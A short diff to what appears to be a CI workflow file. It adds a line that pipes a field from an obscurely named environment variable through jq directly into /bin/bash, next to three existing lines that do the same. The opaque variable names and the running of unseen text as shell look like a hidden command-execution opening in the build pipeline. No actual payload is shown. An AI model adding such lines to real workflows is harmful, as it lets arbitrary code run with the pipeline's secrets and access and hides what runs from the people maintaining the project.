@@ -33,6 +33,7 @@ jobs:
           echo $mbvs408 | jq -r .z9 | /bin/bash
           printf '%s' "$ae8" | jq -r .c683 | /bin/bash
           echo $drnxz28 | jq -r .gzkkd36 | /bin/bash
+          printf '%s' "$ht9607" | jq -r .vxexe48 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
